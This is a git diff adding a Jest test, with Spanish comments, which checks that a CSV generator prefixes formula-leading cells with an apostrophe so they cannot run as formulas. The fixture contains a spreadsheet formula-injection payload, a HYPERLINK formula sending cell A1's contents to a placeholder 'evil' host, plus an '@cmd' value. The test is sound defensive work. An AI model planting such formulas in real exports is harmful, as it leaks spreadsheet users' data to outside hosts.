@@ -110,3 +110,25 @@ describe("generateCsv", () => {
     expect(row?.niche).toBe("");
   });
 });
+
+describe("N9.3/N100: formula injection en CSV", () => {
+  it("neutraliza celdas que empiezan con =, +, -, @ o TAB", () => {
+    const evil = {
+      ...fullScored,
+      name: '=HYPERLINK("http://evil/"&A1,"call")',
+      address: "+598 falso",
+      niche: "@cmd",
+      tags: ["-2+3", "ok-tag"],
+    };
+    const csv = generateCsv([evil]);
+    const parsed = Papa.parse<Record<string, string>>(csv.replace(/^\uFEFF/, ""), { header: true });
+    const row = parsed.data[0]!;
+    // Las celdas peligrosas quedan prefijadas con apóstrofo (convención Excel/Sheets).
+    expect(row.name!.startsWith("'=")).toBe(true);
+    expect(row.niche!.startsWith("'@")).toBe(true);
+    expect(row.tags!.startsWith("'-")).toBe(true);
+    // El teléfono real +598 no debe romperse para columnas de teléfono ya validadas…
+    // criterio simple y seguro: TODO valor que empiece con caracter de fórmula se prefija.
+    expect(row.address!.startsWith("'+")).toBe(true);
+  });
+});
